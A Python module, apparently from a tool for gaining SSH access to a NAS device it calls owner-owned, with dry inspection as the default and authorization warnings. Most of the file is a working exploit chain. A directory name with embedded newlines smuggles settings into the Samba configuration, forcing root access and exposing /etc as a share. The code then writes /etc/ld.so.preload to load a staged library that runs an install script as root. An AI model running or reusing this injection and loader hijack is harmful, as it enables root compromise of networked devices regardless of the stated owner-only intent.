"""Experimental, single-device owner bootstrap. Dry inspection is the default.

Never use this module on a device without its owner's authorization. A private
local recovery journal is retained until cleanup is verified. No credentials
or device transcripts are returned from the public functions.
"""
import base64
import hashlib
import json
import os
import re
import secrets
import socket
import stat
import time
from pathlib import Path

from .api import SUPPORTED_VERSION, NasError
from .ssh import SSHConfig, verify_ssh
from .trigger import build_trigger


def injection_directory(uid):
    return ("N" * 30 + '\n"\n' + f"set sambashare.u{uid}_2.user_force=root\n"
            f"set sambashare.u{uid}_2.create_mask=0644\n"
            f"set sambashare.u{uid}_2.path=etc\n"
            f"set sambashare.u{uid}_2.comment=")


def public_key(identity):
    data = Path(str(Path(identity).expanduser()) + ".pub").read_text().split()
    if len(data) < 2 or data[0] != "ssh-ed25519":
        raise NasError("Use an existing Ed25519 identity and its .pub file.")
    try:
        binary = base64.b64decode(data[1], validate=True)
    except ValueError:
        raise NasError("Invalid public-key encoding.") from None
    if len(binary) != 51 or binary[:19] != b"\0\0\0\x0bssh-ed25519\0\0\0\x20":
        raise NasError("Invalid Ed25519 public key.")
    # A local key's user@machine comment is unnecessary on the NAS.
    return " ".join(data[:2])


def account_digest(rows):
    return hashlib.sha256(json.dumps(rows, sort_keys=True, separators=(",", ":")).encode()).hexdigest()


def inspect(api):
    version = api.version()
    rows = api.accounts()
    compatible = (len(rows) == 1 and str(rows[0].get("id")) == "1"
                  and rows[0].get("username") not in (None, "", "u" + api.uid))
    return {"firmware": version, "supported_firmware": version == SUPPORTED_VERSION,
            "account_layout_supported": compatible, "existing_account_count": len(rows),
            "mutual_tls_verified": True, "device_changes": False}


def write_private(path, data):
    path = Path(path)
    path.parent.mkdir(parents=True, mode=0o700, exist_ok=True)
    path.parent.chmod(0o700)
    if path.is_symlink():
        raise NasError("Refusing a symlink recovery journal.")
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW, 0o600)
    os.fchmod(fd, 0o600)
    with os.fdopen(fd, "w") as output:
        json.dump(data, output)


class Share:
    def __init__(self, host, uid, password):
        import smbclient
        self.client = smbclient
        smbclient.register_session(host, username="u" + uid, password=password,
                                    encrypt=True, auth_protocol="ntlm", connection_timeout=10)
        self.root = "\\\\" + host + "\\etc-" + uid + "\\"

    def path(self, name):
        if name.startswith(("/", "\\")) or ".." in name.replace("\\", "/").split("/"):
            raise NasError("Invalid administrative share-relative path.")
        return self.root + name.replace("/", "\\")

    def exists(self, name):
        return self.client.path.exists(self.path(name))

    def read(self, name):
        with self.client.open_file(self.path(name), "rb") as source:
            return source.read()

    def write(self, name, data, *, exclusive=False, verify=True):
        with self.client.open_file(self.path(name), "xb" if exclusive else "wb") as output:
            output.write(data)
        if verify and self.read(name) != data:
            raise NasError("Staged file readback failed.")

    def mkdir(self, name):
        self.client.mkdir(self.path(name))

    def archive_claim(self, relative):
        source = relative + "/preload.claimed"
        if self.exists(source):
            self.client.rename(self.path(source), self.path(source + "." + secrets.token_hex(4)))


def arm(share, stage):
    if share.exists("ld.so.preload"):
        raise NasError("Existing loader configuration must not be overwritten.")
    relative = stage.removeprefix("/etc/")
    share.archive_claim(relative)
    # The root initializer may claim the file immediately after close; do not reopen it.
    share.write("ld.so.preload", (stage + "/trigger.so\n").encode(), exclusive=True, verify=False)


def _stage_files(share, state):
    stage = state["stage"]
    relative = stage.removeprefix("/etc/")
    if not share.exists(relative):
        share.mkdir(relative)
    config = {k: state[k] for k in ("host", "uid", "token", "port", "directory_name", "public_key")}
    share.write(relative + "/config.json", json.dumps(config).encode())
    share.write(relative + "/device.py", Path(__file__).with_name("device.py").read_bytes())
    share.write(relative + "/trigger.so", build_trigger(stage))


def request_cleanup(share, state, undo):
    _stage_files(share, state)
    stage = state["stage"]
    action = "rollback" if undo else "cleanup"
    script = (f"#!/bin/sh\numask 077\nchmod 700 {stage}\n"
              f"PYTHONDONTWRITEBYTECODE=1 python3 {stage}/device.py {stage}/config.json {action} "
              f">{stage}/cleanup.log 2>&1\n")
    share.write(stage.removeprefix("/etc/") + "/run.sh", script.encode())
    arm(share, stage)


def bootstrap(api, identity, state_dir, *, apply=False, experimental=False, port=22):
    plan = inspect(api)
    if not apply:
        return {"mode": "read_only_plan", **plan}
    if not experimental:
        raise NasError("Refactored bootstrap is experimental; explicitly pass --experimental with --apply.")
    if not plan["supported_firmware"] or not plan["account_layout_supported"]:
        raise NasError("Unsupported firmware or account layout; no device changes made.")
    if not isinstance(port, int) or not 1 <= port <= 65535:
        raise NasError("Invalid SSH port.")
    for candidate in sorted({22, port}):
        try:
            with socket.create_connection((api.host, candidate), timeout=2):
                raise NasError("An SSH port is already open. Use verify instead of reinstalling.")
        except ConnectionRefusedError:
            pass
        except socket.timeout:
            raise NasError("SSH port availability is unknown; activation refused.") from None
    key = public_key(identity)
    before = api.accounts()
    token = secrets.token_hex(6)
    state_dir = Path(state_dir).expanduser()
    if state_dir.is_symlink():
        raise NasError("Refusing a symlink state directory.")
    state_dir.mkdir(parents=True, mode=0o700, exist_ok=True)
    state_dir.chmod(0o700)
    journal = state_dir / ("session-" + token + ".json")
    state = {"host": api.host, "uid": api.uid, "token": token, "port": port,
             "directory_name": injection_directory(api.uid), "public_key": key,
             "password": secrets.token_urlsafe(24), "stage": "/etc/.nas-ssh-" + token,
             "before_accounts_sha256": account_digest(before), "phase": "prepared"}
    write_private(journal, state)
    share = None
    committed = False
    try:
        api.make_directory(state["directory_name"])
        state["phase"] = "directory_created"
        write_private(journal, state)
        payload = {"username": "u" + api.uid, "password": state["password"],
                   "share_dir": ["/home/u" + api.uid + "/pool0/data/" + state["directory_name"]]}
        try:
            api.call("netshare/add_samba_account", payload)
        except NasError:
            # A restart error may occur after the account was created. Inspect state, never add twice.
            pass
        rows = api.accounts()
        expected = [r for r in rows if str(r.get("id")) == "2" and r.get("username") == "u" + api.uid]
        original = [r for r in rows if str(r.get("id")) == "1"]
        if len(expected) != 1 or original != before:
            raise NasError("Account layout changed unexpectedly; inspect the private recovery journal.")
        state["phase"] = "account_created"
        write_private(journal, state)
        api.call("netshare/set_samba_account", {"id": "2", "username": "u" + api.uid,
                                                "password": state["password"], "share_dir": ["/etc"]})
        share = Share(api.host, api.uid, state["password"])
        if share.exists("ld.so.preload"):
            raise NasError("Device already has loader configuration; activation refused.")
        _stage_files(share, state)
        stage = state["stage"]
        run = (f"#!/bin/sh\numask 077\nchmod 700 {stage}\n"
               f"(sleep 240; PYTHONDONTWRITEBYTECODE=1 python3 {stage}/device.py {stage}/config.json watchdog) "
               f"</dev/null >{stage}/watchdog.log 2>&1 &\n"
               f"PYTHONDONTWRITEBYTECODE=1 python3 {stage}/device.py {stage}/config.json install "
               f">{stage}/install.log 2>&1\n")
        share.write(stage.removeprefix("/etc/") + "/run.sh", run.encode())
        state["phase"] = "activation_pending"
        write_private(journal, state)
        arm(share, stage)
        status = None
        for _ in range(90):
            path = stage.removeprefix("/etc/") + "/status.json"
            if share.exists(path):
                status = json.loads(share.read(path))
                break
            time.sleep(1)
        if not status or status.get("ready") is not True:
            raise NasError("Activation did not pass; cleanup is being requested.")
        host_key = status.get("host_public_key", "")
        if not re.fullmatch(r"ssh-ed25519 [A-Za-z0-9+/=]+", host_key):
            raise NasError("Invalid host-key response; host verification refused.")
        known = state_dir / ("known-hosts-" + token)
        entry = api.host if port == 22 else f"[{api.host}]:{port}"
        write_private(known, {})
        known.write_text(entry + " " + host_key + "\n")
        config = SSHConfig(host=api.host, identity=str(Path(identity).expanduser()), known_hosts=str(known), port=port)
        checks = verify_ssh(config)
        if not checks["passed"]:
            raise NasError("SSH command verification failed; configuration will be rolled back.")
        share.write(stage.removeprefix("/etc/") + "/committed", b"verified\n")
        committed = True
        state["phase"] = "verified_cleanup_pending"
        write_private(journal, state)
        import subprocess
        base, target = config.arguments()
        result = subprocess.run(base + ["-T", target, f"PYTHONDONTWRITEBYTECODE=1 python3 {stage}/device.py {stage}/config.json cleanup"],
                                capture_output=True, timeout=60)
        if result.returncode or account_digest(api.accounts()) != state["before_accounts_sha256"]:
            raise NasError("SSH verified, but temporary-account cleanup needs local review.")
        state["password"] = None
        state["phase"] = "complete"
        write_private(journal, state)
        return {"passed": True, "mode": "installed", "checks": checks["checks"],
                "temporary_account_removed": True, "reboot_tested": False}
    except Exception:
        state["phase"] = "cleanup_required"
        write_private(journal, state)
        if share is not None:
            try:
                request_cleanup(share, state, undo=not committed)
            except Exception:
                pass
        raise NasError("Setup did not finish. Private recovery state retained; run cleanup before retrying.") from None


def recover(api, journal):
    journal = Path(journal).expanduser()
    info = journal.lstat()
    if not stat.S_ISREG(info.st_mode) or info.st_mode & 0o077 or info.st_uid != os.getuid():
        raise NasError("Recovery journal must be a regular owner-only file.")
    state = json.loads(journal.read_text())
    if state["host"] != api.host or state["uid"] != api.uid:
        raise NasError("Journal does not match the authenticated device.")
    if (not re.fullmatch(r"[0-9a-f]{12}", state["token"])
            or state["stage"] != "/etc/.nas-ssh-" + state["token"]
            or state["directory_name"] != injection_directory(api.uid)
            or not isinstance(state["port"], int) or not 1 <= state["port"] <= 65535):
        raise NasError("Recovery journal scope validation failed.")
    if not state.get("password"):
        return {"cleanup_complete": True, "already_complete": True}
    rows = api.accounts()
    if account_digest(rows) == state["before_accounts_sha256"]:
        state["password"] = None
        state["phase"] = "account_cleanup_verified_device_configuration_requires_review"
        write_private(journal, state)
        return {"temporary_account_removed": True, "configuration_review_required": True}
    share = Share(api.host, api.uid, state["password"])
    committed = share.exists(state["stage"].removeprefix("/etc/") + "/committed")
    request_cleanup(share, state, undo=not committed)
    for _ in range(90):
        time.sleep(1)
        if account_digest(api.accounts()) == state["before_accounts_sha256"]:
            state["password"] = None
            state["phase"] = "account_cleanup_verified"
            write_private(journal, state)
            return {"temporary_account_removed": True, "rollback_requested": not committed}
    raise NasError("Cleanup could not be verified; preserve the private journal for local recovery.")
